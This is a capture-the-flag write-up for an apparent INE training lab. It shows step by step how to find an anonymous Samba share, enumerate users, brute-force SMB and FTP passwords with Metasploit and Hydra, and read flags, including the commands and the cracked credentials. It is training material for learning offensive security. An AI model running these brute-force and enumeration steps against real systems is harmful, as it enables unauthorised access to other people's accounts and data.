### We need to access the Samba Share that allows Anonymous Access
To find the share that allows `Anonymous` login, we need to write a script. Other pre-made tools did not correctly find the share. We will use the `shares.txt` file to brute force.

#### Brute-Force script to find the Share that allows Anonymous login
```bash
#!/bin/bash

TARGET_IP="target.ine.local"  # replace with your target IP

while read -r share; do
    # Try to connect but hide all output
    smbclient "\\\\$TARGET_IP\\$share" -N -c "quit" &>/dev/null
    if [ $? -eq 0 ]; then
        echo "Anonymous access allowed on: $share"
    fi
done < ~/Desktop/wordlists/shares.txt
```

#### Once the share is found, Access the share
```bash
smbclient //target.ine.local/pubfiles -N
```

#### Read the file
```bash
ls
get flag1.txt

cat flag1.txt
```

---
### Samba users have a bad password. Their private Share has the same name as their Username
#### List all the users using `enum4linux`
```bash
enum4linux -a target.ine.local > smb-enum
```

**We found four users:**
- josh, bob, nancy, alice

#### Create a user list for brute force
```bash
vim userlist.txt
```

### Hydra is not ideal for SMB brute-force. So, we'll try Metasploit
**Brute Force**
```bash
msfconsole -q

msf auxiliary(smb_login) > set RHOSTS target.ine.local
RHOSTS => RHOSTS target.ine.local
msf auxiliary(smb_login) > set User_File userlist.txt
SMBUser => userlist.txt
msf auxiliary(smb_login) > set Pass_File Desktop/wordlists/unix_passwords.txt
SMBPass => Desktop/wordlists/unix_passwords.txt
msf auxiliary(smb_login) > set verbose false
THREADS => false
msf auxiliary(smb_login) > run
```

**Output**
```bash
[+] 192.236.101.3:445     - 192.236.101.3:445 - Success: '.\josh:purple'
[+] 192.236.101.3:445     - 192.236.101.3:445 - Success: '.\alice:admin'
[*] target.ine.local:445  - Scanned 1 of 1 hosts (100% complete)
[*] target.ine.local:445  - Bruteforce completed, 2 credentials were successful.
[*] target.ine.local:445  - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

#### Access the Share
```bash
smbclient //target.ine.local/josh/ -U josh
```

#### Read the flag
```bash
ls
get flag2.txt

cat flag2.txt
```

---
### Hint given in previous flag: I heard there is an FTP service running
#### Nmap
```bash
nmap -p- -A target.ine.local                                                                                                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 03:30 IST
Nmap scan report for target.ine.local (192.236.101.3)
Host is up (0.000050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bb:ca:49:7e:f5:5c:6e:bf:8a:55:a1:69:d9:c9:18:01 (RSA)
|   256 da:06:c1:ab:e7:6f:14:b9:50:d5:43:a7:47:ab:80:ce (ECDSA)
|_  256 a1:5c:ab:22:6b:c2:f1:5c:5a:7a:5a:d8:e7:81:e2:33 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
5554/tcp open  ftp         vsftpd 2.0.8 or later
MAC Address: 02:42:C0:EC:65:03 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: blah; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-13T22:00:34
|_  start_date: N/A
|_nbstat: NetBIOS name: TARGET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.05 ms target.ine.local (192.236.101.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
```

#### Login via FTP
```bash
ftp target.ine.local 5554                                                                                                                             
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
```

There's a hint during the FTP login. It provides 3 usernames.

#### Create a new userlist to brute-force
```bash
vim userlist.txt

ashley
alice
amanda
```

#### Brute-Force using Hydra
```bash
hydra -L userlist.txt -P Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[5554][ftp] host: target.ine.local   login: alice   password: pretty
```

**We have managed to find the password. Now, login via ftp.**
#### Read the file
```bash
ls
get flag3.txt

cat flag3.txt
```

---
### This is a warning meant to deter unauthorized users from logging in
Check the nmap result, there is `ssh` service running. Try to connect to it.

```bash
ssh target.ine.local
```

This gives us our last flag.